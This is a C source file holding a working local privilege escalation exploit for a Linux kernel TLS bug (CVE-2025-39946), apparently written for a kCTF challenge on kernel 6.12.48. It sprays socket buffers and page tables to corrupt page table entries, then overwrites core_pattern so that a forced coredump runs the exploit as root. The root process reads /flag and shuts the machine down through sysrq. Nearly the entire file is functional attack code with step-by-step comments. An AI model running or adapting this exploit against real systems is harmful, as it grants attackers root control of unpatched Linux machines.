// Exploit for CVE-2025-39946

#define _GNU_SOURCE
#include <errno.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/tls.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/sendfile.h>

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define PORT 4444
#define PAGE_SIZE 4096
#define NUM_FRAGS 6

// SKB_SPRAY_COUNT can only be max 2000. This is how many
// sockets are opened for spraying, and with ulimit -n 4096 (which
// is the default hard limit), we can only open ~2000 sockets
#define SKB_SPRAY_COUNT 2000
#define PAGETABLE_BASE 0xdead0000uL

// Play around with the count and pagetable size here to see
// the best params to make the spray reliable. These params
// were very reliable for me on lts-6.12.48, but on the kCTF
// instance I had to run it a couple of times before it worked.
#define PT_SPRAY_COUNT 512
#define PAGETABLE_SIZE 0x400000
void *page_spray[PT_SPRAY_COUNT];

// `core_pattern` physical address offset from kernel base in
// 6.12.48
#define CORE_PATTERN_OFFSET 0x32107e0uL
#define KBASE 0x1000000uL

void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

static void setup_rlimits(void) {
    struct rlimit flim = { .rlim_cur = 4096, .rlim_max = 4096 };
    //struct rlimit clim = { .rlim_cur = RLIM_INFINITY, .rlim_max = RLIM_INFINITY };
    //SYSCHK(setrlimit(RLIMIT_CORE, &clim));
    SYSCHK(setrlimit(RLIMIT_NOFILE, &flim));
}

static void setup_tls(int sock)
{
    struct tls12_crypto_info_aes_ccm_128 crypto = {0};
    crypto.info.version = TLS_1_2_VERSION;
    crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;

    // Set receive buffer size to 0 to trigger memory pressure later
    SYSCHK(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &(int){0}, sizeof(int)));

    SYSCHK(setsockopt(sock, IPPROTO_TCP, TCP_ULP, "tls", sizeof("tls")));
    SYSCHK(setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)));
}

void exploit(void)
{
    // Setup sockets
    int listener;
    int conn;
    int client;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PORT),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };

    // Setup the sockets
    listener = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
    SYSCHK(setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)));
    SYSCHK(bind(listener, (struct sockaddr *)&addr, sizeof(addr)));
    SYSCHK(listen(listener, 1));

    client = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
    SYSCHK(connect(client, (struct sockaddr *)&addr, sizeof(addr)));
    conn = SYSCHK(accept(listener, NULL, NULL));

    // We already sprayed 6 fragment SKBs before this function
    // was called.
    //
    // Setup TLS now and the anchor SKB should be
    // re-allocated on top of one of the 6 fragment SKBs.
    setup_tls(conn);

    // Anchor SKB is re-allocated now, so spray pagetable entries
    unsigned int count = 0;

    for (int i = 0; i < PT_SPRAY_COUNT; i++) {
        SYSCHK(page_spray[i] = mmap((void *)(PAGETABLE_BASE + (PAGETABLE_SIZE * i)), PAGETABLE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));

        // Need to access every page to generate pagetable entries
        for (int j = 0; j < PAGETABLE_SIZE / 0x1000; j++) {
            count = *(unsigned char *)(page_spray[i] + j * 0x1000);
        }
    }

    printf("Completed pagetable spray\n");

    // Setup complete, exploit time
    //
    // Set up the data that we will use to overwrite the page table entries with.
    //
    // Since we don't know the kernel base address (but we know the lowest it will
    // be at will be KBASE), we set up each page entry at multiples of KBASE,
    // and add the `CORE_PATTERN_OFFSET` to that.
    //
    // Page table entries always have the last 12 bits zeroed out (hence the
    // `& ~0xfff` that you see below), because they point to pages that have the
    // same characteristic.
    //
    // Instead, the last three bits are used to store flags.
    //
    // We set 0x67 (0b1100111) here. It essentially sets up the page for write
    // access and userspace access.
    //
    // Note that all of these addresses we're cycling through should be valid
    // physical addresses, so there's no problem with crashing the kernel here
    // by guessing.
    char garbage[0x1000];
    for (int i = 0; i < 0x1000 / 8; i++) {
        *(size_t *)(garbage + i * 8) = ((KBASE * i) + (CORE_PATTERN_OFFSET & ~0xfff) | 0x67);
        //*(size_t *)(garbage + i * 8) = (0x414141414141uL & ~0xfff) | 0x67;
    }

    // Trigger the bug now.
    send(client, garbage, 1, 0);
    send(client, garbage, 1, MSG_OOB);
    send(client, garbage, 0x1000, 0);

    // Reset the receive buffer size to the max value so we can keep sending data
    SYSCHK(setsockopt(conn, SOL_SOCKET, SO_RCVBUF, &(int){0xffffffff}, sizeof(int)));

    // Once this loop completes, our page table entries will be overwritten
    // by the data in `garbage`
    for (int i = 0; i < 10; i++) {
        //printf("s%d\n", i);
        send(client, garbage, 1, MSG_OOB);
    }

    printf("Looking for core pattern\n");

    int core_pattern_found = 0;

    for (int i = 0; i < PT_SPRAY_COUNT; i++) {
        //printf("Checking page %d\n", i);
        for (int j = 0; j < PAGETABLE_SIZE / 0x1000; j++) {
            char *maybe_core_pattern = page_spray[i] + j * 0x1000 + (CORE_PATTERN_OFFSET & 0xfff);
            if (!strcmp(maybe_core_pattern, "core")) {
                //printf("%s\n", maybe_core_pattern);

                // Overwrite `core_pattern` with this special string:
                // "|/proc/%P/fd/666 %P"
                //
                // Remember that we dup'd our exploit process to fd 666.
                // `core_pattern` will be triggered from our current exploit process
                // over to fd 666, and the %P here is the PID of the current process.
                //
                // We use this PID to steal stdout from the current process over to
                // the new exploit process that coredump will launch through fd 666.
                strcpy(maybe_core_pattern, "|/proc/%P/fd/666 %P");
                core_pattern_found = 1;
                break;
            }
        }
        if (core_pattern_found) break;
    }

    core_pattern_found ?
        printf("Found core pattern, triggering coredump\n") :
        printf("No core pattern found, try again\n");

    // Trigger segfault and coredump to get flag
    *(size_t *)0 = 0;

    close(conn);
    close(client);
    close(listener);
}

void skb_spray(void)
{
    int pipefd[2];
    int clients[SKB_SPRAY_COUNT];
    int accepted_conns[SKB_SPRAY_COUNT];
    int listener_fd;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(4444),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };

    char buf[((size_t)NUM_FRAGS * PAGE_SIZE)];
    memset(buf, 'B', sizeof(buf));

    // Use these pipes for the splicing to create 6 fragment SKBs
    SYSCHK(pipe(pipefd));

    SYSCHK(listener_fd = socket(AF_INET, SOCK_STREAM, 0));
    SYSCHK(setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)));
    SYSCHK(bind(listener_fd, (struct sockaddr *)&addr, sizeof(addr)));
    SYSCHK(listen(listener_fd, SKB_SPRAY_COUNT));

    // Spray the SKBs
    // We add 8 bytes to the 6th fragment so that later, when
    // we start overwriting page table entries, the overwrites
    // are aligned to 8 bytes
    size_t total = (NUM_FRAGS * PAGE_SIZE) - PAGE_SIZE + 8;
    for (int i = 0; i < SKB_SPRAY_COUNT; ++i) {
        write(pipefd[1], buf, total);

        SYSCHK(clients[i] = socket(AF_INET, SOCK_STREAM, 0));
        SYSCHK(connect(clients[i], (struct sockaddr *)&addr, sizeof(addr)));
        SYSCHK(accepted_conns[i] = accept(listener_fd, NULL, NULL));

        // Splice syscall (through `tcp_sendmsg_locked()`) allows creating
        // SKBs with controlled amount of fragments
        SYSCHK(splice(pipefd[0], NULL, clients[i], NULL, total, 0));
    }

    for (int i = 0; i < SKB_SPRAY_COUNT; ++i) {
        close(clients[i]);
        close(accepted_conns[i]);
    }

    close(listener_fd);
    close(pipefd[0]);
    close(pipefd[1]);
}

int main(int argc, char **argv)
{
    // Get the flag when coredump calls this with the exploit process's pid as argv[1]
    if (argc > 1) {
        // Takes the calling exploit process's PID, opens it, takes it, and dups it onto
        // the coredump process's stdout.
        //
        // Without this, the flag won't get printed to stdout
        int pid = strtoull(argv[1], 0, 10);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        dup2(stdoutfd, 1);

        system("cat /flag");
        system("cat /flag");
        system("cat /flag");
        system("cat /flag");
        system("cat /flag");
        system("cat /flag;echo o>/proc/sysrq-trigger");
    }

    // Opens the exploit process into a memfd, and dups it onto fd 666 for later
    int memfd = memfd_create("", 0);
    sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
    dup2(memfd, 666);
    close(memfd);

    printf("Starting exploit\n");

    // Pin to CPU 0 to make sure the page table spray works
    pin_on_cpu(0);

    // Bump up the file limit in case it's not set to the default hard limit
    setup_rlimits();

    printf("Starting skb spray\n");
    skb_spray();

    printf("Spray finished, starting exploit\n");
    exploit();
    return 0;
}